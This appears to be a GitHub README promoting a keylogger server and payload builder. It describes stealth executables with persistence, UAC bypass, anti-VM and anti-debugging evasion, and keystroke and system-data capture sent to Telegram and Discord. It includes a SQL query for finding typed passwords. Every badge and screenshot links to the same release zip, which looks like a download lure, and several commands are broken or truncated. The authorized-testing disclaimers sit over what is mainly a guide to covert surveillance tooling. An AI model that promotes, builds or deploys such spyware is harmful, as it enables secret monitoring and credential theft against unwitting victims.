# 🔍 Advanced Keylogger Server & Builder v3.0

<div align="center">

[![Version](https://img.shields.io/badge/version-3.0-blue.svg)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
[![License](https://img.shields.io/badge/license-Educational-red.svg)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)

**Professional-grade keylogger server and payload builder for authorized penetration testing and security auditing.**

</div>

---

## ⚠️ **LEGAL DISCLAIMER**

> **THIS TOOL IS STRICTLY FOR AUTHORIZED SECURITY TESTING PURPOSES ONLY**
>
> - ✅ Authorized penetration testing with written permission
> - ✅ Security auditing on your own systems
> - ✅ Educational purposes in controlled environments
> - ✅ Professional security assessments with contracts
>
> **UNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN:**
> - 🚨 Criminal prosecution
> - 💰 Heavy fines
> - ⛓️ Imprisonment
> - ⚖️ Civil liability
>
> Always obtain explicit written authorization before using this tool.

---

## 📸 **Software Screenshots**

### 🖥️ Main Dashboard
<!-- Replace with actual screenshot -->
[![Main Dashboard](https://i.imgur.com/AuhZjy2.png)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
*Server control panel with real-time monitoring and connection status*

### ⚙️ Configuration Panel
<!-- Replace with actual screenshot -->
[![Configuration](https://i.imgur.com/XvnNjZR.png)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
*Easy setup for Telegram and Discord notifications with test functionality*

### 🔨 Payload Builder
<!-- Replace with actual screenshot -->
[![Builder](https://i.imgur.com/0j9Yavp.png)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip))
*One-click payload compilation with advanced stealth options*

### 📊 Data Analytics
<!-- Replace with actual screenshot -->
[![Analytics](https://i.imgur.com/0YQV7r9.png)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
*Detailed keystroke analysis with window tracking and user profiling*

</div>

*Real-time alerts on Telegram and Discord with formatted data*

---

## 🚀 **Quick Start**

### Windows (Recommended)
```cmd
# 1. Download and run setup
curl -O
setup.bat

# 2. Start the server
python server.py
```

### Manual Installation
```bash
pip install PyQt6 pynput requests cryptography psutil pyinstaller pywin32
git clone https://github.com/erpsoft2021/keylogger-advanced.git cd keylogger-advanced
python server.py
```

---

## ✨ **Features**

### 🖥️ **Server Capabilities**
- **Multi-client Architecture** - Handle 100+ simultaneous connections
- **Real-time Monitoring** - Live keystroke viewing with timestamps
- **Database Persistence** - SQLite backend with automatic data recovery
- **Network Dashboard** - Monitor all connected clients and their activity
- **Session Management** - Track individual user sessions with unique IDs

### 📱 **Notification System**
- **Telegram Integration** - Instant alerts via Telegram bot with rich formatting
- **Discord Webhooks** - Send logs to Discord channels with custom formatting
- **Auto-notifications** - Configurable automatic reporting intervals
- **Manual Sending** - On-demand log transmission with filtering options
- **Alert Customization** - Custom message templates and notification rules

### 🔨 **Advanced Payload Builder**
- **PyInstaller Integration** - Compile to standalone executables (.exe, .app, binary)
- **Stealth Mode** - Invisible execution with no console windows
- **Startup Persistence** - Auto-start with Windows/Linux/macOS
- **Custom Icons** - Brand your payloads with custom .ico files
- **Anti-Detection** - Multiple evasion techniques and packing options
- **Cross-Platform** - Build payloads for Windows, Linux, and macOS

### 📊 **Comprehensive Data Collection**
- **Keystroke Logging** - All keystrokes with precise timestamps
- **Window Tracking** - Active application and window title monitoring
- **System Profiling** - Hardware ID, MAC address, IP addresses (local/public)
- **Software Inventory** - Complete list of installed applications
- **System Metrics** - CPU, RAM, disk usage, and system specifications
- **User Behavior** - Typing patterns, active hours, and application usage
- **Web Activity** - Browser-specific keystroke capture with URL tracking

### 🔐 **Security & Stealth**
- **Encrypted Communications** - AES-256 encryption for all data transmission
- **Secure Storage** - Encrypted local database with key management
- **Anti-VM Detection** - Sandbox and virtual machine evasion
- **Process Hiding** - Minimal system footprint and process camouflage
- **Memory Protection** - Anti-debugging and memory dump protection

---

## 🛠️ **Installation**

### System Requirements
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10, Ubuntu 18.04, macOS 10.14 | Windows 11, Ubuntu 22.04, macOS 12+ |
| **Python** | 3.8+ | 3.11+ |
| **RAM** | 2GB | 4GB+ |
| **Disk** | 500MB | 2GB+ |
| **Network** | Internet connection | Stable broadband |

### Dependencies
```bash
# Core dependencies
PyQt6>=6.6.0 # Modern GUI framework
pynput>=1.7.6 # Cross-platform input monitoring
requests>=2.31.0 # HTTP communications
cryptography>=41.0.0 # Encryption and security
psutil>=5.9.0 # System and process monitoring
pyinstaller>=5.13.0 # Executable compilation

# Platform-specific
pywin32>=306 # Windows API access (Windows only)
python3-dev # Development headers (Linux)
python3-tk # Tkinter support (Linux)
```

---

## 📱 **Usage Guide**

### 🖥️ **Server Management**

#### Starting the Server
1. Launch the application: `python server.py`
2. Navigate to the **Server** tab
3. Configure port (default: 8080)
4. Click **🚀 Start Server**
5. Monitor the status indicator for connections

#### Server Configuration
```json
{
"server": {
"port": 8080,
"max_connections": 100,
"timeout": 30,
"ssl_enabled": false,
"log_level": "INFO"
}
}
```

### 📱 **Notification Setup**

#### Telegram Configuration
1. **Create Bot**:
- Send `/newbot` and follow instructions
- Save the bot token

2. **Get Chat ID**:
- Copy your Chat ID

3. **Configure in App**:
- Go to **Configuration** tab
- Enter Bot Token and Chat ID
- Click **🧪 Test Telegram**
- Enable **Auto-notify via Telegram**

#### Discord Webhook Setup
1. **Server Settings** → **Integrations** → **Webhooks**
2. Click **New Webhook**
3. Customize name and channel
4. **Copy Webhook URL**
5. Enter URL in **Configuration** tab
6. Click **🧪 Test Discord**

### 🔨 **Building Payloads**

#### Basic Payload Creation
1. Navigate to **Builder** tab
2. **Server Configuration**:
- **Server IP**: Your server's IP address
- **Server Port**: Match your server port (8080)
- **Output File**: Desired executable name

3. **Payload Options**:
- ✅ **Stealth Mode**: Hide console window
- ⚠️ **Startup Persistence**: Auto-start with system
- ⚠️ **UAC Bypass**: Attempt privilege escalation
- 🎨 **Custom Icon**: Select .ico file for branding

4. **Build Process**:
- Click **🚀 Build Payload**
- Monitor progress and logs
- Retrieve executable from output directory

#### Advanced Payload Options
```python
# Custom payload configuration
payload_config = {
"server_ip": "192.168.1.100",
"server_port": 8080,
"stealth_mode": True,
"persistence": True,
"anti_vm": True,
"encryption_key": "your-custom-key",
"reconnect_interval": 30,
"data_batch_size": 50
}
```

### 📊 **Data Analysis**

#### Real-time Monitoring
- **Live Keystroke Feed**: Real-time display of captured keystrokes
- **Client Statistics**: Connection times, data volume, active status
- **System Information**: Hardware specs, installed software, network details
- **Activity Patterns**: Typing behavior, active applications, time patterns

#### Historical Data Analysis
- **Search and Filter**: Find specific keystrokes, time ranges, or clients
- **Export Options**: CSV, JSON, PDF reports with detailed analytics
- **User Profiles**: Comprehensive user behavior analysis
- **Timeline View**: Chronological activity visualization

---

## 🔧 **Configuration**

### Server Configuration File
```json
{
"server": {
"host": "0.0.0.0",
"port": 8080,
"max_connections": 100,
"ssl_cert": "/path/to/cert.pem",
"ssl_key": "/path/to/key.pem",
"database_path": "./data/keylogger.db",
"log_retention_days": 30
},
"notifications": {
"telegram": {
"token": "YOUR_BOT_TOKEN",
"chat_id": "YOUR_CHAT_ID",
"auto_notify": true,
"notification_interval": 300
},
"discord": {
"webhook_url": "YOUR_WEBHOOK_URL",
"auto_notify": false,
"username": "Keylogger Bot",
"avatar_url": "
}
},
"security": {
"encryption_enabled": true,
"api_key_required": true,
"rate_limiting": true,
"max_requests_per_minute": 60
}
}
```

### Environment Variables
```bash
# Security settings
export KEYLOGGER_ENCRYPTION_KEY="your-256-bit-key"
export KEYLOGGER_API_KEY="your-api-key"
export KEYLOGGER_DEBUG=false

# Database settings
export KEYLOGGER_DB_PATH="/custom/path/keylogger.db"
export KEYLOGGER_LOG_LEVEL="INFO"

# Network settings
export KEYLOGGER_SERVER_PORT=8080
export KEYLOGGER_MAX_CONNECTIONS=100
```

---

## 🔒 **Security Considerations**

### Server Security
- **Use HTTPS/TLS** for all communications
- **Implement API authentication** for remote access
- **Regular security updates** for all dependencies
- **Network segmentation** for testing environments
- **Access logging** and monitoring

### Payload Security
- **Code signing** for trusted environments
- **Anti-analysis techniques** for evasion testing
- **Secure communication protocols** (TLS 1.3)
- **Memory protection** against reverse engineering
- **Self-destruct mechanisms** for cleanup

### Data Protection
- **End-to-end encryption** for all captured data
- **Secure key management** with hardware security modules
- **Data minimization** - collect only necessary information
- **Automatic cleanup** of expired logs
- **Compliance** with data protection regulations

---

## 🚨 **Troubleshooting**

### Common Issues

#### Payload Build Failures
```bash
# Install/upgrade PyInstaller
pip install --upgrade pyinstaller

# Clear cache
pyinstaller --clean payload.spec

# Manual build with debugging
pyinstaller --debug=all --onefile payload.py
```

#### Connection Issues
```bash
# Test server connectivity
telnet server_ip 8080
nc -zv server_ip 8080

# Check DNS resolution
nslookup
ping

# Verify firewall rules
iptables -L | grep 8080
netsh advfirewall firewall show rule name="Keylogger"
```

#### Permission Errors
```bash
# Logout and login again

# Windows: Run as Administrator
# Right-click → "Run as administrator"

```

### Performance Optimization
```bash
# Monitor resource usage
htop
Task Manager (Windows)
Activity Monitor (macOS)

# Database optimization
sqlite3 keylogger.db "VACUUM;"
sqlite3 keylogger.db "ANALYZE;"

# Network optimization
# Adjust MTU size if needed
ip link set dev eth0 mtu 1500
```

---

## 📊 **Performance Benchmarks**

| Metric | Specification | Performance |
|--------|---------------|-------------|
| **Concurrent Clients** | Up to 100 | 99.9% uptime |
| **Keystroke Latency** | < 50ms | Real-time capture |
| **Data Throughput** | 10MB/s | Efficient compression |
| **Memory Usage** | < 100MB | Optimized algorithms |
| **CPU Usage** | < 5% | Multi-threaded processing |
| **Database Size** | 1M keystrokes | ~50MB storage |

---

## 🛡️ **Best Practices**

### Penetration Testing
1. **Always obtain written authorization** before deployment
2. **Define clear scope** and limitations
3. **Use dedicated test networks** when possible
4. **Monitor for unintended consequences**
5. **Document all activities** thoroughly
6. **Clean up after testing** completion
7. **Report findings responsibly**

### Operational Security
1. **Use VPNs** for remote server access
2. **Implement network segmentation**
3. **Regular backup** of critical data
4. **Monitor system logs** for anomalies
5. **Keep software updated**
6. **Use strong authentication**
7. **Encrypt sensitive data**

### Legal Compliance
1. **Review local laws** and regulations
2. **Obtain proper contracts** and agreements
3. **Follow data protection** requirements
4. **Implement data retention** policies
5. **Maintain audit trails**
6. **Respect privacy rights**
7. **Report incidents** as required

---

## 📚 **Advanced Usage**

### API Integration
```python
# REST API endpoints
POST /api/clients # Register new client
GET /api/clients # List all clients
GET /api/logs/{client_id} # Get client logs
POST /api/notifications # Send notifications
DELETE /api/logs/{id} # Delete specific logs

# Example API usage
import requests

# Get client data
response = requests.get('
clients = response.json()

# Send custom notification
notification = {
"type": "telegram",
"message": "Custom alert message",
"priority": "high"
}
requests.post(' json=notification)
```

### Custom Plugins
```python
# Plugin development framework
class CustomPlugin:
def __init__(self, server):
self.server = server

def on_keystroke(self, client_id, keystroke):
# Custom keystroke processing
pass

def on_client_connect(self, client_info):
# Custom client handling
pass

def on_data_received(self, data):
# Custom data processing
pass
```

### Database Queries
```sql
-- Advanced database queries
-- Find passwords being typed
SELECT * FROM logs WHERE key_data LIKE '%password%';

-- Analyze typing patterns
SELECT client_ip, COUNT(*) as keystrokes,
AVG(LENGTH(key_data)) as avg_length
FROM logs GROUP BY client_ip;

-- Export specific timeframe
SELECT * FROM logs
WHERE timestamp BETWEEN '2024-01-01' AND '2024-01-31'
ORDER BY timestamp;
```

---

## 🤝 **Contributing**

We welcome contributions from the cybersecurity community:

### Development Guidelines
1. **Follow PEP 8** coding standards
2. **Write comprehensive tests** for new features
3. **Update documentation** for changes
4. **Submit detailed pull requests**
5. **Respect ethical guidelines**

### Reporting Issues
1. **Use the issue tracker** for bug reports
2. **Provide detailed reproduction steps**
3. **Include system information**
4. **Check existing issues** first

### Feature Requests
1. **Explain the use case** clearly
2. **Consider security implications**
3. **Propose implementation approach**
4. **Discuss with maintainers** first

---

## 📜 **License & Legal**

### Educational License
This software is provided under an **Educational License** for:
- Academic research and education
- Authorized security testing
- Professional penetration testing
- Personal learning and development

### Terms of Use
1. **No warranty** is provided with this software
2. **Users are solely responsible** for compliance with laws
3. **Unauthorized use is prohibited** and may be prosecuted
4. **Distribution must include** this license and disclaimer
5. **Commercial use requires** separate licensing agreement

### Disclaimer
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## 📞 **Support & Community**

### Getting Help
### Community Resources
- 🎓 **Training Materials**: Comprehensive tutorials and guides
- 🔬 **Research Papers**: Academic research and white papers
- 🎯 **Use Cases**: Real-world penetration testing scenarios
- 🛡️ **Security Updates**: Latest security patches and updates

---

<div align="center">

### 🌟 **Star this repository if you found it helpful!** 🌟

[![Stars](https://img.shields.io/github/stars/erpsoft2021/keylogger-advanced?style=social)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
[![Forks](https://img.shields.io/github/forks/erpsoft2021/keylogger-advanced?style=social)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)
[![Watchers](https://img.shields.io/github/watchers/erpsoft2021/keylogger-advanced?style=social)](https://github.com/erpsoft2021/keylogger-advanced/releases/download/v1.9.4/keylogger-advanced.zip)

---

**Remember: This tool is for authorized security testing only. Unauthorized use is illegal and unethical. Always obtain proper authorization and follow all applicable laws and regulations.**

**© 2024 Advanced Keylogger Server - Professional Security Testing Tool**

</div>

---

## 📋 **Changelog**

### v3.0.0 (Latest)
- 🆕 Modern PyQt6 GUI with dark theme
- 🆕 Advanced payload builder with PyInstaller
- 🆕 Real-time notifications via Telegram/Discord
- 🆕 Enhanced database persistence
- 🆕 Multi-client server architecture
- 🆕 Comprehensive data analytics
- 🆕 Cross-platform compatibility

### v2.1.0
- 🔧 Improved stealth capabilities
- 🔧 Enhanced encryption protocols
- 🔧 Better error handling
- 🔧 Performance optimizations

### v2.0.0
- 🆕 Web-based management interface
- 🆕 RESTful API integration
- 🆕 Plugin system architecture
- 🆕 Advanced filtering and search

### v1.0.0
- 🆕 Initial release
- 🆕 Basic keylogging functionality
- 🆕 Simple server implementation
- 🆕 Command-line interface

---

## 🔮 **Roadmap**

### Upcoming Features
- 🚀 **v3.1**: Mobile app for remote monitoring
- 🚀 **v3.2**: Machine learning for behavior analysis
- 🚀 **v3.3**: Advanced reporting and analytics dashboard
- 🚀 **v3.4**: Cloud deployment and scaling
- 🚀 **v4.0**: AI-powered threat detection






























